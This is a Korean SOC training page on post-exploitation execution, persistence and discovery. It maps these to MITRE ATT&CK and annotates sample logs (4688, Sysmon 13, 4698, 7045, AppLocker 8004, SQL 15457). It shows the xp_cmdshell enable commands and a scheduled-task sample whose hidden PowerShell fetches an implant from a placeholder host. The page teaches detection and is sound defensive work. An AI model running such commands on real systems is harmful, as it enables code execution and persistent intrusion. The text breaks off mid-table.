---
title: "실행, 지속성, 정보 탐색 — 익스플로잇 직후 공격자가 하는 일"
tags:
  - training
  - blue-team
  - endpoint
  - execution
  - persistence
  - discovery
---

# 실행, 지속성, 정보 탐색 — 익스플로잇 직후 공격자가 하는 일 { #execution-persistence-discovery }

!!! abstract "이 페이지에서 다루는 것"
    익스플로잇이 성공하는 순간 무엇이 바뀌는지부터 봅니다. 이제 공격자는 그 호스트의 프로세스 하나를 "손에 쥔" 상태이고, 여기서부터 하는 일은 모두 <strong>익스플로잇 이후 활동(post-exploitation)</strong>입니다. MITRE ATT&CK이 이 활동들을 **전술(tactic)·기법(technique)·하위 기법(sub-technique)** 으로 어떻게 나누는지, SOC가 왜 이걸 탐지 체크리스트로 쓰는지 설명합니다. 이어서 익스플로잇 이후의 첫 세 전술을 자세히 봅니다. <strong>실행(Execution)</strong> — 코드를 돌리는 단계(익스플로잇 안에 실린 페이로드, 단순 셸과 C2 에이전트, SQL Server `xp_cmdshell`처럼 제한된 인터프리터에서 빠져나오기)와 <strong>애플리케이션 제어</strong>가 왜 그렇게 잘 먹히는지. <strong>지속성(Persistence)</strong> — 공격자가 일부러 지속성을 <em>안</em> 심는 이유, 그래도 대부분 심는 이유, 여러 겹으로 심으면 어설픈 정리가 왜 실패하는지(Run 키, 예약 작업, 서비스, WMI). <strong>정보 탐색(Discovery)</strong> — 기본 내장 명령으로 사용자·그룹·권한·파일·서비스·호스트·소프트웨어를 훑는 "환경 속에 숨어 살기(living off the land)", 명령 하나하나에 알림을 걸면 왜 SOC가 마비되는지, 대신 <strong>몰아치는 패턴(burst)</strong>으로 잡는 법. 모든 샘플(4688, Sysmon 1·13, 4698, 7045, AppLocker 8004, SQL Server 15457, 명령 출력)을 칸 단위로 풀어 봅니다. 끝에 확인 문제가 있습니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, IP, 해시, 파일 이름은 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. 익스플로잇이 성공하면 공격자는 <strong>내 호스트의 어떤 프로세스 안에서 코드를 실행</strong>할 수 있게 됩니다. 여기서부터는 전부 <strong>익스플로잇 이후 활동</strong>이고, 한 단계 나아갈 때마다 정리(복구)는 더 어렵고 더 비싸집니다.
2. <strong>MITRE ATT&CK</strong>은 공격자의 목표를 <strong>전술</strong>("왜": 실행, 지속성, 정보 탐색…)로, 그 목표를 이루는 방법을 <strong>기법</strong>("어떻게": T1053 Scheduled Task/Job)으로, 더 구체적인 변형을 <strong>하위 기법</strong>(T1053.005 Scheduled Task)으로 나눕니다. 많은 SOC가 이걸 "최소한 이건 잡아야 한다" 목록으로 씁니다.
3. <strong>실행</strong>: 첫 코드는 보통 익스플로잇 안에 <strong>페이로드(payload)</strong>로 실려 옵니다. 대개 <strong>명령 셸</strong>을 열거나, 기능이 많은 <strong>C2 에이전트</strong>(Meterpreter 같은 것)를 올리고, 그걸로 도구를 더 내려받아 돌립니다.
4. 때로는 셸이 아니라 <strong>인터프리터</strong>에 떨어집니다 — SQL 프롬프트, 관리 웹 콘솔, 스크립트 엔진. 그러면 그 환경이 원래 가진 기능으로 OS 명령을 돌립니다. SQL Server의 `xp_cmdshell`이 대표 사례입니다. 증거: `sqlservr.exe` → `cmd.exe`.
5. 실행을 못 하면 공격자는 거의 아무것도 못 합니다. 그래서 <strong>애플리케이션 제어(application control)</strong>가 강력합니다. 막힌 시도 하나하나가 차단이면서 동시에 <strong>이른 경보</strong>이기 때문입니다.
6. <strong>지속성</strong>은 <strong>저울질</strong>입니다. 재부팅·로그오프·어설픈 정리 뒤에도 접근을 지켜 주지만, Run 키·작업·서비스 하나하나가 보안 도구에 들킬 수 있는 변화입니다. 은밀함이 최우선인 공격자(특히 되풀이 가능한 서비스 측 구멍이 있는 공격자)는 건너뛸 수도 있습니다.
7. 공격자는 지속성을 자주 <strong>여러 겹</strong>으로 심습니다 — 예: 임플란트를 띄우는 Run 키 + 지워지면 다시 내려받는 예약 작업. 하나만 지우고 하나를 놓치면 정리는 <strong>실패</strong>합니다. 깨끗하다고 선언하기 전에 전부 찾아야 합니다.
8. <strong>정보 탐색</strong> — 나는 누구, 어떤 그룹, 어떤 권한, 어떤 파일·서비스·호스트·소프트웨어 — 은 대부분 <strong>기본 내장 명령</strong>(`whoami`, `net`, `nltest`, `tasklist`, `netstat`, `dir /s`)으로 합니다. 하나만 보면 평범한 관리 작업이고, <strong>한 낯선 부모 프로세스나 계정에서 여러 종류가 몰아쳐 나오는 것</strong>이 신호입니다.

## 익스플로잇 다음: 익스플로잇 이후 활동 { #post-exploitation }

### 익스플로잇이 성공하면 뭐가 달라지나 { #what-changes }

익스플로잇 전의 공격자는 밖에서 문을 두드리는 사람입니다. 익스플로잇 뒤에는 그 프로세스의 신원을 가진 채 <strong>실행 중인 프로세스 안에</strong> 들어와 있습니다([공격자는 뚫린 프로세스가 된다](initial-exploitation.md#becomes-the-process) 참고). 창문으로 막 기어 들어온 도둑을 떠올려 보세요. 들어온 건 한 번의 행동이지만, 진짜 피해는 그다음 한 시간에 생깁니다. 나중에 다시 오려고 뒷문을 살짝 열어 두고, 서랍을 뒤지고, 금고를 찾고, 다른 건물 열쇠를 찾는 것 — 이 "그다음 한 시간"이 익스플로잇 이후 활동입니다.

SOC 입장에서 이게 왜 중요할까요? 공격자가 한 단계 나아갈 때마다 대응 비용이 뛰기 때문입니다.

| 공격자가 도달한 단계 | 정리는 어떤 모습인가 |
| --- | --- |
| 익스플로잇이 막혔거나 첫 프로세스에서 잡힘 | 구멍 막고, 확인하고, 끝 |
| 코드는 돌았지만 지속성 없음 | 격리, 프로세스 종료, 패치, 자료 유출 여부 확인 |
| 지속성이 심어짐 | 심어진 <strong>모든</strong> 장치를 찾아 지우거나, 호스트를 다시 설치 |
| 자격 증명 탈취, 옆으로 이동 | 여러 호스트, 비밀번호·티켓 재설정, 경우에 따라 도메인 전체 복구 |

그래서 <strong>실행</strong>과 <strong>지속성</strong> 단계에서 일찍 잡는 데 공을 들일 가치가 큽니다.

### ATT&CK: 전술, 기법, 하위 기법 { #attack-structure }

MITRE ATT&CK(Adversarial Tactics, Techniques, and Common Knowledge)은 실제 침해 사례에서 모은 공개 지식 베이스입니다. 구조는 한 번 보면 간단합니다.

- <strong>전술(Tactic)</strong> = 공격자의 단기 <strong>목표</strong>, 즉 *왜* 하는가. 예: <strong>Persistence(TA0003)</strong>.
- <strong>기법(Technique)</strong> = 그 목표에 이르는 <strong>방법</strong>, 즉 *어떻게* 하는가. 예: <strong>T1053 Scheduled Task/Job</strong>.
- <strong>하위 기법(Sub-technique)</strong> = 더 <strong>구체적인 변형</strong>. 예: <strong>T1053.005 Scheduled Task</strong>(Windows 작업 스케줄러). 리눅스의 T1053.003 Cron과 구분됩니다.

요리에 빗대면, 전술은 "저녁 준비"(목표), 기법은 "굽기"(방법), 하위 기법은 "오븐에 굽기 / 팬에 굽기"(구체적 방식)입니다. 기술적으로는 각 항목이 고유 ID를 가지고 있어서, 탐지 규칙·경보·보고서에 이 ID를 붙여 모두가 같은 말로 이야기할 수 있습니다.

현재 Enterprise 전술 목록입니다. 대략 침투가 진행되는 순서입니다.

| ID | 전술 | 한 줄 뜻 |
| --- | --- | --- |
| TA0043 | Reconnaissance(정찰) | 밖에서 대상 알아보기 |
| TA0042 | Resource Development(자원 준비) | 인프라·계정·도구 마련 |
| TA0001 | Initial Access(최초 접근) | 들어오기 |
| TA0002 | **Execution(실행)** | 코드 돌리기 |
| TA0003 | **Persistence(지속성)** | 접근 유지 |
| TA0004 | Privilege Escalation(권한 상승) | 더 높은 권한 얻기 |
| TA0005 | Stealth(은신) | 눈에 안 띄기(섞이기, 숨기, 위장) |
| TA0112 | Defense Impairment(방어 무력화) | 보안 도구와 로그를 망가뜨리거나 눈멀게 하기 |
| TA0006 | Credential Access(자격 증명 접근) | 비밀번호·해시·티켓·토큰 훔치기 |
| TA0007 | **Discovery(정보 탐색)** | 안에서 환경 파악하기 |
| TA0008 | Lateral Movement(옆으로 이동) | 다른 시스템으로 옮겨 가기 |
| TA0009 | Collection(수집) | 원하는 자료 모으기 |
| TA0011 | Command and Control(명령·제어) | 자기 인프라와 통신 |
| TA0010 | Exfiltration(유출) | 자료 빼내기 |
| TA0040 | Impact(영향) | 암호화, 파괴, 마비 |

(예전 자료와 많은 탐지 규칙에는 TA0005가 아직 **Defense Evasion(방어 회피)** 으로 적혀 있습니다. 이 전술은 2026년에 Stealth와 Defense Impairment 둘로 나뉘었습니다. 아래 2026년 관점을 보세요.)

기법 페이지마다 그 행동이 어떻게 동작하는지, 어떤 위협 그룹과 악성코드가 썼는지, 어떻게 <strong>완화</strong>하고 <strong>탐지</strong>하는지가 정리돼 있습니다. 그래서 많은 팀이 이 표를 <strong>커버리지 체크리스트</strong>로 씁니다. "우리와 관련 있는 기법마다, 그걸 볼 데이터와 탐지 규칙이 있나?" 현실적으로 모든 칸을 똑같이 채우는 건 불가능합니다. 거의 안 보이는 기법도 있고, 평범한 관리 작업과 똑같은 기법도 있으니까요. 하지만 사각지대를 찾고, 탐지를 같은 언어로 이야기하는 도구로는 아주 훌륭합니다.

!!! tip "[보충] SOC가 기법 ID를 실제로 쓰는 법"
    - <strong>탐지 규칙마다 기법 ID를 붙입니다.</strong> 그러면 무엇을 잡고 무엇을 못 잡는지 히트맵(heat map)을 그릴 수 있습니다.
    - <strong>경보와 사고 타임라인에도 붙입니다.</strong> "07:42 T1059.001, 07:43 T1547.001, 07:45 T1087.002"라고 적어 두면 다음 분석가가 이야기 흐름을 한눈에 봅니다.
    - <strong>위협 정보에 맞춰 우선순위를 정합니다.</strong> 우리 업종 위협 보고서에 T1053.005와 T1021.002가 계속 나오면, 그게 먼저 만들고 시험할 탐지입니다.

## 전술: 실행(Execution, TA0002) { #execution }

### 페이로드는 익스플로잇에 실려 옵니다 { #payload }

익스플로잇은 프로그램을 오작동하게 만드는 "수법"일 뿐, 그 자체로는 공격자에게 쓸모 있는 일을 하지 않습니다. 그래서 <strong>페이로드</strong>를 싣고 옵니다. 납치된 프로세스가 맨 처음 실행할 명령입니다. 익스플로잇이 통하면 페이로드는 곧바로, 그 프로세스의 신원으로 실행됩니다.

비유하면 익스플로잇은 창문을 따는 쇠지렛대, 페이로드는 그 창문으로 기어 들어가는 도둑입니다. 쇠지렛대 혼자서는 아무것도 훔치지 못합니다.

흔한 페이로드는 이렇습니다.

- <strong>그냥 명령 셸</strong> — 납치된 프로세스가 `cmd.exe`, `powershell.exe`, `/bin/sh`를 띄우고, 공격자는 네트워크 연결로 명령을 칩니다. 피해자가 공격자 쪽으로 연결해 나가면 "리버스 셸(reverse shell)", 피해자가 포트를 열고 기다리면 "바인드 셸(bind shell)"입니다.
- <strong>완전한 C2 에이전트("임플란트")</strong> — Meterpreter(Metasploit 프레임워크의 페이로드)나 다른 C2 프레임워크의 에이전트처럼 기능이 많은 페이로드입니다. 파일 올리기·내려받기, 화면 캡처, 다른 프로세스로 옮겨 타기, 자격 증명 탈취, 다른 망으로 넘어가는 중계(pivoting) 같은 명령이 기본으로 들어 있고, 원래 프로세스 안에서 <strong>메모리에만</strong> 존재하는 경우가 많습니다.
- <strong>작은 "스테이저(stager)"</strong> — 진짜 임플란트를 내려받아 띄울 만큼의 코드만 있는 1단계 조각입니다(그다음이 2단계).

이 중 무엇이든 손에 넣으면 공격자는 이걸 <strong>발판(foothold)</strong>으로 씁니다. 도구를 더 내려받아 돌리고, 지속성과 정보 탐색으로 넘어갑니다. 완전한 셸을 얻을 수 있는지는 익스플로잇에 따라 다릅니다. 명령 한 줄만 돌릴 수 있게 해 주는 익스플로잇도 있고, 제한된 환경에 떨어뜨리는 것도 있습니다.

관련 ATT&CK: **T1059 Command and Scripting Interpreter**(`.001` PowerShell, `.003` Windows Command Shell, `.004` Unix Shell), **T1106 Native API**, **T1047 Windows Management Instrumentation**, **T1569.002 Service Execution**, **T1204 User Execution**(클라이언트 측).

### 인터프리터에서 빠져나오기: `xp_cmdshell` 사례 { #xp-cmdshell }

모든 침투가 셸을 주지는 않습니다. 공격자가 Microsoft SQL Server의 `sa` 비밀번호를 맞혔거나, 웹 앱의 SQL 인젝션을 이용했다고 해 봅시다. 지금 공격자 앞에 있는 건 <strong>SQL 프롬프트</strong>입니다. 표를 조회할 수는 있지만 `whoami`를 칠 수는 없습니다. 그래서 OS 명령을 돌려 주는 <strong>그 환경 자체의 기능</strong>을 찾습니다.

SQL Server에는 바로 그런 기능이 있습니다. 확장 저장 프로시저 **`xp_cmdshell`** 입니다. 문자열을 받아 Windows 명령 셸을 띄우고, 그 문자열을 넘겨 실행한 뒤 출력을 행(row)으로 돌려줍니다. <strong>기본값은 꺼짐</strong>(SQL Server 2005부터)이지만, `sysadmin` 권한이 있으면 누구나 켤 수 있습니다. 방어자가 공격자의 SQL 입력으로 보게 되는 모습은 이렇습니다.

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

- 1줄 — `sp_configure 'show advanced options', 1`은 고급 설정을 보이게 하고, `RECONFIGURE`가 그걸 적용합니다. `xp_cmdshell`이 "고급" 옵션이라 먼저 필요합니다.
- 2줄 — `xp_cmdshell`을 0(꺼짐)에서 1(켜짐)으로 바꾸고 적용합니다.
- 3줄 — 진짜 Windows 셸에서 `whoami`를 실행합니다. 결과는 열 하나짜리 표로 돌아옵니다.

```
output
-----------------------------
nt service\mssqlserver
NULL
```

`nt service\mssqlserver`는 SQL Server <strong>서비스 신원</strong>입니다. 이제 공격자가 OS에서 이 계정이 된 것입니다(맨 끝 `NULL` 행은 원래 붙어 나옵니다). 만약 서비스가 `LocalSystem`이나 도메인 관리자 계정으로 돌고 있었다면(실제로 있습니다), 이 한 줄이 곧 완전 장악입니다.

비유하면, 호텔 손님은 주방에 못 들어가지만 룸서비스는 주문서에 적은 대로 요리해 줍니다. `xp_cmdshell`은 운영체제에 대한 룸서비스입니다.

<strong>로그에 어떻게 남나:</strong>

1. <strong>SQL Server 자체 메시지.</strong> 이 옵션을 바꾸면 Windows <strong>Application</strong> 로그(원본 `MSSQLSERVER`)에 이벤트 **15457**이 남고, 같은 문장이 SQL Server `ERRORLOG`에도 남습니다.

    ```
    Log Name:   Application
    Source:     MSSQLSERVER
    Event ID:   15457
    Computer:   SRV-SQL-0004.corp.example
    Message:    Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
    ```

    - `Event ID 15457` — "서버 구성 옵션이 바뀌었다". 어떤 `sp_configure` 변경이든 생기지만 운영 환경에서는 드뭅니다. 그래서 <strong>`xp_cmdshell`이 적힌 15457은 무조건 들여다볼 가치가 있습니다.</strong>
    - `changed from 0 to 1` — 꺼져 있던 게 켜졌다는 뜻. 공격자는 흔히 쓰고 나서 다시 0으로 돌려놓습니다. 그러면 몇 분 뒤 "from 1 to 0" 15457이 또 보이는데, 이건 일부러 썼다는 강한 신호입니다.

2. <strong>프로세스 생성</strong> — 결정적 증거입니다. SQL 서버의 4688:

    ```
    EventID:            4688
    Computer:           SRV-SQL-0004.corp.example
    NewProcessName:     C:\Windows\System32\cmd.exe
    CommandLine:        "cmd.exe" /c whoami
    ParentProcessName:  C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
    TargetUserName:     MSSQLSERVER
    TargetDomainName:   NT SERVICE
    ```

    - 4688은 "새 프로세스가 생성됨" 이벤트입니다. 프로세스가 시작될 때마다 생기고(프로세스 생성 감사가 켜져 있을 때), 공격자가 손으로 하는 거의 모든 일이 여기에 찍히기 때문에 중요합니다.
    - `ParentProcessName … sqlservr.exe` — 데이터베이스 엔진이 셸을 띄웠습니다. `w3wp.exe` → `cmd.exe`처럼, <strong>DB 엔진이 셸을 띄우는 건 거의 언제나 정상이 아닙니다</strong>(옛 유지 보수 작업 중 일부가 그러니, 기준선(baseline)을 잡고 나머지에 알림).
    - `CommandLine "cmd.exe" /c whoami` — `xp_cmdshell`은 늘 문자열을 `cmd.exe /c`로 감싸기 때문에 이 모양이 특징입니다.
    - `TargetUserName/TargetDomainName NT SERVICE\MSSQLSERVER` — 셸이 도는 신원. 즉 "무엇이 뚫렸나"의 답입니다.

같은 원리는 다른 곳에도 있습니다. "진단 실행" 입력칸이 있는 웹 관리 콘솔, CI/CD 서버의 빌드 스크립트, 모니터링 도구의 "사용자 정의 점검", 라우터의 디버그 셸. <strong>명령을 실행해 주는 기능은 모두 실행 경로입니다.</strong> ATT&CK은 이런 것 상당수를 T1059로 다루고, 접근을 유지하려고 SQL 저장 프로시저를 심는 경우는 **T1505.001 SQL Stored Procedures**(지속성)로 다룹니다.

### 애플리케이션 제어가 잘 먹히는 이유 { #app-control }

실행은 공격 전체의 병목입니다. 도구가 안 돌면 자격 증명 덤프도, 암호화도 없습니다. <strong>애플리케이션 제어</strong>(허용 목록, allow-listing)는 승인된 프로그램과 스크립트만 — 게시자 서명, 경로, 해시 기준으로 — 실행되게 하는 것입니다. Windows에는 **AppLocker**와 **App Control for Business**(예전 이름 WDAC)가 있고, 리눅스에는 `fapolicyd` 같은 도구가 있습니다.

두 번 도움이 됩니다.

- <strong>예방</strong> — 공격자가 `C:\Users\Public\`에 떨군 `svc_update.exe`가 그냥 안 뜹니다.
- <strong>탐지</strong> — 차단이 기록됩니다. 잘 다듬은 정책이라면 정상 사용자가 걸릴 일이 드뭅니다. 그래서 서버나 관리자 PC에서 차단이 나오면 <strong>신호가 아주 강한 이른 경보</strong>이고, 침투를 처음 알아채는 계기가 되는 경우가 많습니다.

`Microsoft-Windows-AppLocker/EXE and DLL` 로그의 AppLocker 차단 기록입니다.

```
Event ID:  8004
Level:     Error
Computer:  LT-FIN-0117.corp.example
User:      CORP\p.nguyen
Message:   %OSDRIVE%\USERS\PUBLIC\SVC_UPDATE.EXE was prevented from running.
PolicyName: EXE
RuleName:  -
FilePath:  %OSDRIVE%\USERS\PUBLIC\SVC_UPDATE.EXE
FileHash:  9C2E…77A1
Fqbn:      -
```

- `Event ID 8004` — <strong>차단됨</strong>(강제 모드). `8003`은 <strong>감사 전용</strong> 모드에서 같은 상황("강제 모드였다면 막혔을 것"), `8002`는 허용됨입니다. 공격자에게 8004가 무서운 이유: 도구가 실패했고 <strong>동시에 들켰다</strong>는 뜻이기 때문입니다.
- `User` — 누가 실행하려 했나. 재무팀 사용자가 `C:\Users\Public`에서 EXE를 띄우는 건 정상이 아닙니다.
- `FilePath` — `C:\Users\Public`은 누구나 쓸 수 있는 폴더라 공격자가 즐겨 파일을 떨구는 곳입니다.
- `Fqbn: -` — "완전한 바이너리 이름(fully qualified binary name)"이 비어 있다 = 어떤 게시자도 <strong>서명하지 않은</strong> 파일입니다.
- `FileHash` — EDR이나 위협 정보에서 이 해시로 검색해 다른 곳에도 있는지 봅니다.

App Control for Business는 같은 내용을 `Microsoft-Windows-CodeIntegrity/Operational`에 남깁니다(**3077** = 차단, **3076** = 감사). 애플리케이션 제어와 그 우회는 엔드포인트 방어 섹션에서 자세히 다룹니다.

## 전술: 지속성(Persistence, TA0003) { #persistence }

### 심을까, 말까 { #persist-or-not }

지속성이란 접근이 <strong>살아남게</strong> 만드는 것입니다. 재부팅, 사용자 로그오프, 익스플로잇한 프로세스의 충돌, 백신이 파일 하나 지우는 것 — 이런 일이 생겨도 다시 들어올 수 있게요. 이건 자동으로 되는 게 아니라 비용이 따르는 <strong>선택</strong>입니다.

비유: 다시 오고 싶은 도둑은 현관 매트 밑에 예비 열쇠를 숨기고 경보 비밀번호를 베껴 둘 수 있습니다. 다음 방문은 쉬워지지만, 예비 열쇠는 꼼꼼한 집주인이 찾을 수 있는 물건이고, 그걸 찾는 순간 집주인은 도둑이 들었다는 걸 압니다.

| 심는 이유 | 안 심는 이유 |
| --- | --- |
| 긴 작전은 몇 주, 몇 달 동안 접근이 필요 | 지속성 장치는 모두 보안 도구가 찾을 수 있는 <strong>변화</strong> |
| 다시 익스플로잇하는 건 위험(소음 증가)하고 안 될 수도 있음(패치됨, 사용자가 다시 안 누름) | 원래 구멍이 계속 열려 있으면(서비스 측) 그냥 다시 오면 됨 |
| 재부팅, 로그오프, 비밀번호 변경에도 살아남음 | 어떤 작전은 은밀함이 최우선 |
| <strong>부분적인</strong> 정리(백신이 파일 하나 지움)에도 살아남음 | 짧은 "털고 튀기" 작전(빠른 자료 탈취)에는 필요 없음 |

앞 페이지와 이어 보면, <strong>클라이언트 측</strong>으로 들어온 공격자(사용자가 눌러 줘야 함)는 지속성을 빨리 심을 <strong>가능성이 크고</strong>, 되풀이 가능한 <strong>서비스 측</strong> 구멍이 있는 공격자는 건너뛸 수도 있습니다.

### 여러 겹 지속성과 실패한 정리 { #layered }

조심성 있는 공격자는 장치 하나에 기대지 않습니다. `LT-FIN-0117`에 실제로 있을 법한 구성입니다.

1. <strong>Run 키</strong>가 사용자가 로그온할 때마다 임플란트를 띄웁니다.
2. <strong>예약 작업</strong>이 한 시간마다 돌면서 임플란트 파일이 아직 있는지 보고, 없으면 <strong>다시 내려받습니다</strong>.
3. 경우에 따라 세 번째 사본으로 <strong>WMI 이벤트 구독</strong>이나 <strong>서비스</strong>.

이제 SOC가 백신 경보로 임플란트를 발견해 파일과 Run 키를 지우고 티켓을 닫습니다. 한 시간 뒤 예약 작업이 새 사본을 받아 옵니다. <strong>정리 실패</strong>입니다. 더 나쁜 건, 공격자가 이제 들켰다는 걸 안다는 점입니다. 교훈: 지속성 장치 하나를 찾으면 <strong>다른 것도 있다고 가정하고</strong> 흔한 종류를 모두 훑거나, 호스트를 다시 설치하세요.

흔한 Windows 지속성 장치와 증거입니다.

| 장치 | ATT&CK | 위치 | 가장 좋은 증거 |
| --- | --- | --- | --- |
| Run / RunOnce 키 | T1547.001 | `HKCU\…\CurrentVersion\Run`, `HKLM\…\Run` | Sysmon 13(레지스트리 값 설정), EDR, autoruns 점검 |
| 시작프로그램 폴더 | T1547.001 | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | Sysmon 11(파일 생성) |
| 예약 작업 | T1053.005 | `C:\Windows\System32\Tasks\`, 레지스트리 `TaskCache` | **4698**(작업 생성), Task Scheduler Operational 106 |
| 새 서비스 | T1543.003 | `HKLM\SYSTEM\CurrentControlSet\Services` | **7045**(System 로그), **4697**(Security 로그) |
| WMI 이벤트 구독 | T1546.003 | WMI 저장소 | Sysmon 19/20/21, WMI-Activity Operational 5861 |
| 새 로컬·도메인 계정 | T1136 | SAM / AD | 4720(사용자 생성), 4732/4728(그룹에 추가) |
| 리눅스: cron, systemd 유닛, `authorized_keys` | T1053.003, T1543.002, T1098.004 | `/etc/cron*`, `/etc/systemd/system/`, `~/.ssh/` | auditd 파일 감시, FIM |

가장 흔한 세 가지 기록을 읽어 보겠습니다.

### 증거 1: Run 키(Sysmon 13) { #run-key }

```
Event ID: 13   Registry value set
UtcTime:      2026-11-19 07:43:05.118
ProcessId:    9020
Image:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
EventType:    SetValue
TargetObject: HKU\S-1-5-21-1111111111-2222222222-3333333333-1604\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync
Details:      C:\Users\p.nguyen\AppData\Roaming\OneDriveSync\odsync.exe
User:         CORP\p.nguyen
```

- `Event ID 13` — Sysmon "레지스트리 값 설정": 값이 쓰였다는 뜻입니다(Run 키를 감시하는 Sysmon 설정이 필요한데, 좋은 설정은 대부분 감시합니다).
- `Image … powershell.exe` — <strong>PowerShell</strong>이 썼습니다. 진짜 설치 프로그램은 보통 `msiexec.exe`나 그 제품의 설치 프로그램입니다. 스크립트 실행기가 Run 키를 쓰는 건 의심스럽습니다.
- `TargetObject` — `HKU\<SID>\…\Run\OneDriveSync`: 현재 사용자의 Run 키, 값 이름 `OneDriveSync`. 진짜 제품 이름을 <strong>흉내 낸</strong> 위장 수법입니다.
- `Details` — 로그온할 때마다 시작될 프로그램: 진짜 OneDrive가 있는 Program Files가 아니라 **`AppData\Roaming`** 의 EXE입니다.
- `ProcessId 9020` — 이 프로세스의 생성 이벤트로 넘어가 누가 PowerShell을 띄웠는지 봅니다(앞 페이지처럼 Office나 내려받은 파일인 경우가 많습니다).

호스트에서 직접 확인하려면:

```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    MicrosoftEdgeAutoLaunch    REG_SZ    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window
    OneDriveSync    REG_SZ    C:\Users\p.nguyen\AppData\Roaming\OneDriveSync\odsync.exe
```

- `reg query "<키>"` — 그 키 아래의 값을 모두 나열합니다.
- 각 줄은 `이름  형식  데이터`입니다. `REG_SZ` = 문자열 값. 첫 줄은 정상적인 Edge 시작 항목, 두 번째 줄이 공격자 것입니다.

### 증거 2: 예약 작업(4698) { #task }

이벤트 **4698 — "예약 작업이 생성됨"** 은 **Audit Other Object Access Events**(기타 개체 액세스 이벤트 감사)가 켜져 있을 때 Security 로그에 남습니다. 공격자가 예약 작업을 좋아하는 이유는 SYSTEM으로, 정해진 시간마다, 부팅이나 로그온 때 돌릴 수 있고, 평범한 유지 보수 작업처럼 보이기 때문입니다. 이 이벤트에는 <strong>작업 XML 전체</strong>가 들어 있어서 아주 값집니다.

```
EventID:          4698
Computer:         LT-FIN-0117.corp.example
SubjectUserName:  p.nguyen
SubjectDomainName: CORP
TaskName:         \Microsoft\Windows\Maintenance\SyncHealth
TaskContent:
  <Task>
    <Triggers>
      <TimeTrigger>
        <Repetition><Interval>PT1H</Interval></Repetition>
        <StartBoundary>2026-11-19T07:44:00</StartBoundary>
      </TimeTrigger>
    </Triggers>
    <Principals><Principal><UserId>CORP\p.nguyen</UserId></Principal></Principals>
    <Settings><Hidden>true</Hidden></Settings>
    <Actions>
      <Exec>
        <Command>powershell.exe</Command>
        <Arguments>-w hidden -c "if(!(Test-Path $env:APPDATA\OneDriveSync\odsync.exe)){iwr https://cdn.sync-health.example/o.bin -OutFile $env:APPDATA\OneDriveSync\odsync.exe}"</Arguments>
      </Exec>
    </Actions>
  </Task>
```

- `SubjectUserName p.nguyen` — 작업을 만든 사람. 일반 사용자가 `\Microsoft\Windows\…` 아래에 작업을 만드는 건 이상합니다. 그 폴더는 Windows <strong>자신의</strong> 작업이 사는 곳이라, 공격자가 그 사이에 숨은 것입니다.
- `TaskName …\Maintenance\SyncHealth` — 지루해 보이게 지은 이름.
- `TimeTrigger` + `Repetition Interval PT1H` — <strong>한 시간마다</strong> 실행(`PT1H`는 ISO 8601 표기로 "1시간 간격").
- `Principal UserId` — `p.nguyen`으로 실행됩니다(`S-1-5-18`이었다면 SYSTEM으로 실행).
- `Hidden true` — 작업 스케줄러 기본 화면에서 숨김.
- `Actions/Exec` — 실제 동작: 숨긴 PowerShell이 <strong>`odsync.exe`가 있는지 보고, 없으면 다시 내려받습니다</strong>. 바로 "지워지면 다시 받기" 겹입니다.

### 증거 3: 새 서비스(7045 / 4697) { #service }

이벤트 **7045 — "시스템에 서비스가 설치됨"** 은 서비스 제어 관리자(Service Control Manager)가 **System** 로그에 남깁니다. **4697**은 Security 로그 쪽 같은 이벤트입니다(Audit Security System Extension 필요). 서비스는 부팅 때 보통 <strong>SYSTEM</strong>으로 시작되니, 지속성이자 동시에 높은 권한입니다.

```
Log Name:     System
Source:       Service Control Manager
Event ID:     7045
Computer:     SRV-FILE-0003.corp.example
Service Name: Windows Telemetry Helper
Service File Name: C:\ProgramData\WinTel\wtelhlp.exe -k netsvcs
Service Type: user mode service
Service Start Type: auto start
Service Account: LocalSystem
```

- `Service Name` — 마음 놓이게 하는, Microsoft스러운 이름.
- `Service File Name` — 실행 파일이 누구나 쓸 수 있는 **`C:\ProgramData`** 에 있고, `svchost.exe` 서비스처럼 보이려고 `-k netsvcs`를 덧붙였습니다. 진짜 Windows 서비스는 `System32`에 있습니다.
- `auto start` — 부팅할 때마다 시작.
- `LocalSystem` — 로컬에서 가장 높은 권한으로 실행.

더 많은 장치는 [지속성 레퍼런스](../../../adversary/persistence.md)에 정리돼 있고, 4698과 7045는 뒤의 "꼭 알아야 할 이벤트" 섹션에서 깊게 다룹니다.

## 전술: 정보 탐색(Discovery, TA0007) { #discovery }

### 왜 필요한가 { #discovery-why }

익스플로잇 직후 공격자가 아는 건 보통 IP 하나, 호스트 이름 하나, 계정 하나 정도입니다. 목표(자료, 도메인 관리자, 특정 시스템)에 닿으려면 <strong>안에서 지도를 그려야</strong> 합니다. 불 꺼진 사무실 건물에 들어온 도둑을 떠올려 보세요. 엘리베이터 옆 층별 안내도, 문에 붙은 이름표, 벽에 걸린 조직도, 어느 문에 카드 리더기가 있는지를 봅니다. 정보 탐색이 바로 그것이고, 명령으로 합니다.

무엇을 찾는지, 어떤 기본 도구를 쓰는지, ATT&CK 기법은 무엇인지 정리하면 이렇습니다.

| 질문 | 흔한 기본 명령 | ATT&CK |
| --- | --- | --- |
| 나는 누구, 어떤 권한? | `whoami /all`, `id` | T1033 System Owner/User Discovery |
| 어떤 계정이 있나? | `net user`, `net user /domain`, `Get-ADUser` | T1087 Account Discovery(`.001` 로컬, `.002` 도메인) |
| 어떤 그룹, 관리자는 누구? | `net localgroup administrators`, `net group "Domain Admins" /domain` | T1069 Permission Groups Discovery |
| 이 기계는 뭔가? | `systeminfo`, `hostname`, `uname -a` | T1082 System Information Discovery |
